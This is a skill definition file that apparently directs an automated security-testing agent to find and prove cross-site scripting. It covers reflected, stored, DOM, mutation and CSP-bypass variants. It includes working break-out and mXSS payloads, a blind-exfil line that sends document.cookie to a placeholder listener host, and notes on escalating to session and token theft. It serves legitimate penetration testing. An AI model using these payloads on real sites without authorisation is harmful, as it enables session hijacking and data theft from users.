---
name: web-xss
description: >
  Detect and prove cross-site scripting (reflected, stored, DOM, mutation/mXSS,
  blind, CSP-bypass) in web/API responses. USE WHEN a parameter's bytes survive
  into an HTML / attribute / JS / URL context, when a unique canary token reflects
  anywhere in captured responses, or when a JS source→sink path
  (location / postMessage / document.referrer → innerHTML / eval / setAttribute)
  is reachable with attacker-controlled input.
tags: [web, xss, injection, client-side, owasp-a03, dom, mxss, csp]
tools: [httpx, katana, nuclei]
payloads:
  - {kind: glob, path: "vendor/PayloadsAllTheThings/XSS Injection/Intruders/*.txt", license: MIT, credit: "swisskyrepo/PayloadsAllTheThings"}
  - {kind: file, path: "vendor/PayloadsAllTheThings/XSS Injection/README.md", license: MIT, credit: "swisskyrepo/PayloadsAllTheThings"}
  - {kind: upstream_doc, path: "vendor/hacktricks/pentesting-web/xss-cross-site-scripting/README.md", license: CC-BY-SA-4.0, credit: "HackTricks — Carlos Polop"}
verification:
  kind: differential
  expect: {signal: reflection}
  signals: []
references:
  - https://portswigger.net/web-security/cross-site-scripting
  - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
  - https://portswigger.net/web-security/dom-based
  - https://cure53.de/fp170.pdf
license: AGPL-3.0-or-later
version: 1.0.0
---

# XSS — Cross-Site Scripting

Prove that attacker-controlled bytes reach a JavaScript-executing context in a
victim's browser. Detection is cheap; **confirmation is the whole game** — a
payload that "looks reflected" is not a finding until the oracle re-derives it.

## Sub-variants
- **Reflected** — payload echoed in the *immediate* response.
- **Stored / blind** — payload persisted, fires in a *different* endpoint (admin
  panel, log viewer, notification, PDF export). The response you send looks clean.
- **DOM-based** — no server reflection; a JS source (`location`, `location.hash`,
  `document.referrer`, `postMessage`, `window.name`) flows to a sink (`innerHTML`,
  `outerHTML`, `document.write`, `eval`, `Function`, `setAttribute`, jQuery `$()`,
  `$.html()`).
- **Mutation XSS (mXSS)** — markup that is inert until the browser re-serialises
  it (`innerHTML` round-trip, `<noscript>`/`<template>`/namespace confusion),
  including DOMPurify/sanitiser bypasses.
- **Template-adjacent** — a `{{}}`/`${}` sink that is really SSTI; always test
  `{{7*7}}`→`49` before concluding "just XSS" (see `web-ssti`).
- **CSP-bypass XSS** — execution constrained by CSP; escalate via JSONP endpoints,
  `base-uri`/dangling-markup, unsafe `script-src` allowlist, or `nonce` reuse.
- **File-upload XSS** — SVG/HTML/XML uploaded and served same-origin.

## Methodology (recon → probe → confirm → exploit → chain)

1. **Recon (map every reflection).** Browse the app under `burpwn exec`, then
   `req search <CANARY>` for a unique token you seeded into every parameter,
   header and cookie. FTS runs over **all decrypted responses**, so it surfaces
   *stored* reflections that never appeared in the response you sent — this is the
   only reliable way to find blind/stored sinks and their storage endpoint.
2. **Probe (context detection).** `compare` the payloaded response against the
   baseline: the reflection-check tells you whether the bytes survived and in what
   context (HTML text / tag / attribute / `javascript:` URL / JS string / comment).
   Context dictates the break-out — never fire a tag payload into an attribute.
3. **Confirm (deterministic oracle).**
   - *Reflected:* the `differential` oracle — inject a marker, `compare` baseline
     vs payloaded, require the marker in the reflected set (`verify.py` default).
   - *Stored/blind:* the `marker` oracle — `req_search` the canary across the whole
     session; a hit in a *different* flow proves persistence.
   - *DOM / real execution:* drive Playwright MCP (`browser_navigate` +
     `browser_handle_dialog` / `browser_evaluate`) to observe an actual `alert()` /
     sink write — version/reflection match is not execution proof.
   - *Blind exfil:* the `oob` oracle — payload `fetch('//<LISTENER>/?c='+document.cookie)`
     lands as a `dns`/`http`/`rawtcp` flow on the collaborator (`web-*` blind pattern).
4. **Exploit / context-fit break-out.** Fit the payload to the confirmed context
   (`"><svg onload=…>` for HTML, `';alert()//` for JS string, `javascript:` for a
   URL attribute), then `fuzz` a polyglot set across the exact byte position;
   anomaly ranking flags the payload that changed structure.
5. **mXSS.** Feed markup that mutates on re-parse — e.g.
   `<noscript><p title="</noscript><img src=x onerror=alert()>">`, `<svg><style>`
   namespace confusion, or a known DOMPurify bypass — then confirm via Playwright.

## Cross-chain notes
- Stored XSS in an admin-only view → escalate through IDOR / access-control to
  reach the privileged renderer (see `web-host-header` / access-control skills).
- XSS → steal JWT/session → authentication flaws.
- CSP present → chain open-redirect / JSONP / dangling-markup to regain execution.
- A `{{7*7}}=49` render means SSTI (server RCE), not client XSS — pivot to `web-ssti`.
- CORS-trusted subdomain XSS → cross-origin token theft.

## Key payload sources
- PortSwigger XSS cheat sheet (context-indexed break-outs) — `references`.
- `vendor/PayloadsAllTheThings/XSS Injection/` (polyglots, per-context intruders).
- HackTricks XSS (referenced by path only — CC-BY-SA, not embedded).
- Cure53 mXSS / DOMPurify bypass corpus for mutation payloads.

## Verification oracle
Primary: `differential` (reflection-check, marker = the seeded canary). Stored/
blind: `marker` (FTS across decrypted history). Real execution: Playwright dialog.
Blind exfil: `oob` collaborator callback. `verify.py` selects the strongest oracle
for which the caller supplied inputs.
